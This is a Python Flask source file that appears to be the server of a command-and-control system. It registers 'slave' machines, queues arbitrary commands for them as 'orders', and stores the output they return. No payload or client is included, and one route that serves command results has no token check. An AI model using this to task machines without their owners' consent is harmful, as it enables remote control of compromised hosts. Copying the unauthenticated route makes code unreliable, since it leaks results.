from flask import Flask, request, jsonify
import datetime
import sqlite3
import os

app = Flask(__name__)

DATABASE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "control_server2.db")
AUTH_TOKEN = "REDACTED_SECRET"

def initialize_db_v2():
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS computers (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                slaveName TEXT UNIQUE NOT NULL,
                slaveIP TEXT NOT NULL,
                slavePing TEXT,
                freq INTEGER,
                slaveStatus TEXT NOT NULL CHECK(slaveStatus IN ('online', 'offline', 'busy')),
                slaveLastCheckin DATETIME
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                command_id INTEGER,
                slaveName TEXT NOT NULL,
                command_text TEXT NOT NULL,
                created_at DATETIME,
                updated_at DATETIME,
                FOREIGN KEY(slaveName) REFERENCES computers(slaveName)
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS command_responses (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                slaveName TEXT NOT NULL,
                command_id INTEGER,
                response_text TEXT,
                FOREIGN KEY(command_id) REFERENCES commands(id)
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS audit_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                slaveName TEXT NOT NULL,
                command_id INTEGER,
                event_type TEXT NOT NULL,
                event_time DATETIME NOT NULL,
                details TEXT,
                FOREIGN KEY(slaveName) REFERENCES computers(slaveName),
                FOREIGN KEY(command_id) REFERENCES commands(id)
            )
        ''')

        conn.commit()
        conn.close()
        print("Database initialized successfully.")
    except Exception as e:
        print(f"Error initializing database: {e}")

@app.route('/v2/init-db', methods=['GET'])
def init_db_route_v2():
    try:
        initialize_db_v2()
        return jsonify({"message": "Database initialized successfully"}), 200
    except:
        return jsonify({"error": "An error occurred during initialization"}), 500

@app.route('/v2/computer-checkin', methods=['POST'])
def computer_checkin_v2():
    try:
        token = request.headers.get('Authorization')
        if token != f"Bearer {AUTH_TOKEN}":
            return jsonify({"error": "Unauthorized access"}), 401

        data = request.get_json()
        slaveName = data.get('slaveName')
        slaveIP = data.get('slaveIP')
        freq = data.get('freq')
        slavePing = data.get('slavePing')

        if not slaveName or not slaveIP:
            return jsonify({"error": "PC name and IP address are required"}), 400

        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()

        current_time = datetime.datetime.now()
        cursor.execute('SELECT COUNT(*) FROM computers WHERE slaveName = ?', (slaveName,))
        count = cursor.fetchone()[0]

        if count > 0:
            cursor.execute('''
                UPDATE computers 
                SET slaveIP = ?, slaveStatus = 'online', slaveLastCheckin = ?, freq = ?, slavePing = ?
                WHERE slaveName = ?
            ''', (slaveIP, current_time, freq, slavePing, slaveName))
        else:
            cursor.execute('''
                INSERT INTO computers (slaveName, slaveIP, slaveStatus, slaveLastCheckin, slavePing, freq) 
                VALUES (?, ?, 'online', ?, ?, ?)
            ''', (slaveName, slaveIP, current_time, slavePing, freq))

        conn.commit()
        conn.close()
        return jsonify({"message": "Computer check-in successful"}), 200
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"error": "An error occurred"}), 500

@app.route('/v2/fetch-orders', methods=['GET'])
def fetch_orders_v2():
    try:
        token = request.headers.get('Authorization')
        if token != f"Bearer {AUTH_TOKEN}":
            return jsonify({"error": "Unauthorized access"}), 401

        slaveName = request.args.get('slaveName')
        if not slaveName:
            return jsonify({"error": "slaveName is required"}), 400

        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()

        cursor.execute('''
            SELECT id AS command_id, command_text FROM commands
            WHERE slaveName = ?
        ''', (slaveName,))
        
        order = cursor.fetchone()
        if not order:
            return jsonify({"command_id": None, "command_text": "No pending orders"}), 200

        command_id, command_text = order
        cursor.execute('DELETE FROM commands WHERE id = ?', (command_id,))
        conn.commit()
        conn.close()

        print(f"[FETCH-ORDERS] Order {command_id} fetched for {slaveName}")
        return jsonify({
            "command_id": command_id,
            "command_text": command_text
        }), 200
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"error": "An error occurred"}), 500

@app.route('/v2/send-command', methods=['POST'])
def send_command_v2():
    try:
        token = request.headers.get('Authorization')
        if token != f"Bearer {AUTH_TOKEN}":
            return jsonify({"error": "Unauthorized access"}), 401

        data = request.get_json()
        slaveName = data.get('slaveName')
        command_text = data.get('command_text')

        if not slaveName or not command_text:
            return jsonify({"error": "Missing required fields"}), 400

        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()

        current_time = datetime.datetime.now()
        cursor.execute('''
            INSERT INTO commands (slaveName, command_text, created_at, updated_at) 
            VALUES (?, ?, ?, ?)
        ''', (slaveName, command_text, current_time, current_time))

        command_id = cursor.lastrowid
        cursor.execute('''
            INSERT INTO audit_log (slaveName, command_id, event_type, event_time, details)
            VALUES (?, ?, ?, ?, ?)
        ''', (slaveName, command_id, 'command_sent', current_time, f'Sent command'))

        conn.commit()
        conn.close()
        print(f"[SEND-COMMAND] Command sent to {slaveName}")
        return jsonify({"message": "Command sent successfully", "command_id": command_id}), 201
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"error": "An error occurred"}), 500

@app.route('/v2/store-response', methods=['POST'])
def store_response_v2():
    try:
        token = request.headers.get('Authorization')
        if token != f"Bearer {AUTH_TOKEN}":
            return jsonify({"error": "Unauthorized access"}), 401

        data = request.get_json()
        command_id = data.get('command_id')
        command_text = data.get('command_text')
        slaveName = data.get('slaveName')

        if not command_id or not command_text or not slaveName:
            return jsonify({"error": "Missing required fields"}), 400

        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()

        cursor.execute('''
            INSERT INTO command_responses (slaveName, command_id, response_text)
            VALUES (?, ?, ?)
        ''', (slaveName, command_id, command_text))

        conn.commit()
        conn.close()
        print(f"[STORE-RESPONSE] Stored response for {slaveName}")
        return jsonify({"message": "Response stored successfully"}), 201
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"error": "An error occurred"}), 500

@app.route('/v2/fetch-response', methods=['GET'])
def fetch_response_v2():
    try:
        command_id = request.args.get('command_id')
        if not command_id:
            return jsonify({"error": "command_id is required"}), 400

        try:
            command_id = int(command_id)
        except ValueError:
            return jsonify({"error": "Invalid command_id format"}), 400

        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT response_text
            FROM command_responses 
            WHERE command_id = ?
        ''', (command_id,))
        response = cursor.fetchone()

        if not response:
            return jsonify({"error": "No response found for the given command_id"}), 404

        print(f"[FETCH-RESPONSE] Fetched response for command_id {command_id}")
        return jsonify({"response_text": response[0]}), 200
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"error": "An error occurred"}), 500

def update_offline_status():
    CHECKIN_THRESHOLD = datetime.timedelta(seconds=30)
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        time_threshold = datetime.datetime.now() - CHECKIN_THRESHOLD
        cursor.execute('''
            UPDATE computers 
            SET slaveStatus = 'offline' 
            WHERE slaveLastCheckin IS NOT NULL AND slaveLastCheckin < ? AND slaveStatus != 'offline'
        ''', (time_threshold,))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Error updating offline status: {e}")

@app.route('/v2/fetch-slaves', methods=['GET'])
def fetch_slaves_v2():
    try:
        token = request.headers.get('Authorization')
        if token != f"Bearer {AUTH_TOKEN}":
            return jsonify({"error": "Unauthorized access"}), 401

        update_offline_status()
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT slaveName, slaveIP, freq, slaveStatus, slaveLastCheckin, slavePing
            FROM computers
        ''')
        slaves = cursor.fetchall()
        conn.close()
        result = [
            {
                "slaveName": s[0],
                "slaveIP": s[1],
                "freq": s[2],
                "slaveStatus": s[3],
                "slaveLastCheckin": s[4],
                "slavePing": s[5]
            }
            for s in slaves
        ]
        return jsonify(result), 200
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"error": "An error occurred"}), 500
